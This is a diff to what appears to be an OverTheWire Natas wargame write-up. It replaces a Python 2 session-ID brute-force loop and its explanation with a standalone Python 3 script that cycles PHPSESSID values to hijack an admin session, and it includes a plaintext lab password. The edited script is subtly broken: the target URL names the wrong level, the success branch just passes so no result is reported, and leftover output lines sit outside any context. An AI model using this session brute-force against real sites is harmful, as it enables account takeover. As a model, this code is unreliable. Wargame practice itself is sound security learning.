@@ -52,30 +52,33 @@
 
 3.	Now we can try with a brute-force because the range of possible solutions
 	is reasonable (16x16x16).
+import requests
 
-		while x <= 0xf:
-			while y <= 0xf:
-				while z <= 0xf:
-					phpsessid = (('3%s3%s3%s2d61646d696e') %
-								 (hex(x)[2:], hex(y)[2:], hex(z)[2:]))
-					cookies['PHPSESSID'] = phpsessid
-					print 'Trying with: %s' % phpsessid
-					r = requests.get(target, auth=auth, params=params, cookies=cookies)
-					if "You are logged in as a regular user." not in r.text:
-						print r.text
-						sys.exit(0)
-					z += 1
-				y += 1
-				z = 0x0
-			x += 1
-			y = 0x0
-			z = 0x0
+target = 'http://natas18.natas.labs.overthewire.org/index.php'
+auth = ('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
+params = {}  # You can add any additional parameters here if needed
+cookies = {'PHPSESSID': ''}  # Initialize the cookies dictionary with an empty string
 
-	Also in this case, Python is our best friend...
 
-		$ python natas19.py
-		Trying with: 3030302d61646d696e
-		...
+x, y, z = 0x0, 0x0, 0x0
+while x <= 0xf:
+    while y <= 0xf:
+        while z <= 0xf:
+            phpsessid = (('3%s3%s3%s2d61646d696e') %
+                          (hex(x)[2:], hex(y)[2:], hex(z)[2:]))
+            cookies['PHPSESSID'] = phpsessid
+            print ('Trying with: %s' % phpsessid)
+            r = requests.get(target, auth=auth, params=params, cookies=cookies)
+            if "You are logged in as a regular user." not in r.text:
+                # Handle the response here or store it for further processing
+                pass
+            z += 1
+        y += 1
+        z = 0x0
+    x += 1
+    y = 0x0
+    z = 0x0
+
 		Trying with: 33373f2d61646d696e
 		Trying with: 3338302d61646d696e
 		Trying with: 3338312d61646d696e
